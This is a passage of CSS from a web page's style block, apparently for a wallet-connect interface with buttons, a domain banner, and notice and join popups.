    margin: 0 70px;
    margin-right: 10px;

}
.shuaxin_btn{
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center; /* 水平居中 */

}

.cnct_class{
    display: flex;
    justify-content: center;
}
.cnct_domain{
    border: 0px solid rgb(17, 57, 232);
    background-color: rgb(236, 239, 254);
    width: 85%;
    height: 35px;
    color: rgb(17, 57, 232);
    font-size: larger;
    font-weight: 600;
    align-items: center;
    display: flex;
}
span.van-grid-item__text {
    font-size: small;
    font-weight: 900;
}
    hr {
      border: none; /* 移除默认边框 */
      margin: 20px 10px; /* 上下边距 */
    }
.wallt_cnt {
    padding-top: 30px;
    display: flex;
    padding-left: 30px;
}
.connect_button button {
    background-color: #0d6efd;
    height: 40px;
    width: 140px;
    border: none;
    border-radius: 10px;
}
.connect_button {
    position: absolute;
    left: 60%;
    top: 10%;
}
.notice-popup[data-v-51fd882a] {
    position: fixed;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, .7);
}

.notice-popup .notice-container[data-v-51fd882a] {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    width: 6.38rem;
    height: 6.44rem;
    background: #fff;
    border-radius: 0.2rem;
    box-sizing: border-box;
    overflow: auto;
}

.notice-popup .notice-container .notice-title[data-v-51fd882a] {
    position: fixed;
    text-align: center;
    color: #1652f0;
    font-size: .3rem;
    font-family: NunitoBold;
    background-color: #fff;
    padding: 0.32rem;
    width: 6.2rem;
    border-top-left-radius: 8px;
}

.notice-popup .notice-container .notice-content[data-v-51fd882a] {
    padding: 0.32rem;
    margin-top: 0.8rem;
    font-size: .28rem;
    color: #353f5280;
    line-height: normal;
}

.notice-popup .notice-container .notice-title .icon-close[data-v-51fd882a] {
    position: absolute;
    right: 0;
    top: 0;
    bottom: 0;
    margin: auto;
    width: 0.32rem;
    height: 0.32rem;
    color: #000;
}

.join-popup[data-v-51fd882a] {
    padding: 0.48rem 0.4rem 0.35rem;
    width: 6.86rem;
    box-sizing: border-box;
    border-radius: 0.2rem;
}

.join-popup .close[data-v-51fd882a] {
    position: absolute;
    top: 0.32rem;
    right: 0.32rem;
}

.join-popup .popup-content[data-v-51fd882a] {
    text-align: center;
}

.join-popup .popup-content .img-join[data-v-51fd882a] {
    width: 1.27rem;
    height: 1.27rem;
}

.join-popup .popup-content .join-title[data-v-51fd882a] {
    margin-top: 0.67rem;
    padding: 0 0.7rem;
    font-size: .32rem;
    color: #353f52;
    font-weight: 500;
}

.join-popup .popup-content .submit-btn[data-v-51fd882a] {
    margin: 0 auto;
    margin-top: 0.87rem;
    width: 4.46rem;
    height: 0.92rem;
    line-height: .92rem;
    color: #fff;
    background: #1652f0;
    border-radius: 0.2rem;
    text-align: center;
    font-size: .32rem;
}

.ff_NunitoBold {
    font-family: NunitoBold;
}

.join-popup .popup-content .tips[data-v-51fd882a] {
    margin-top: 0.4rem;
    font-size: .24rem;
    color: #5b616e80;
}

svg[data-v-51fd882a] {
    width: 0.4rem;
    height: 0.4rem;
}

.ynone {
    opacity: 0;
    position: fixed;
    top: -9999px;
    left: -9999px;
}
</style>

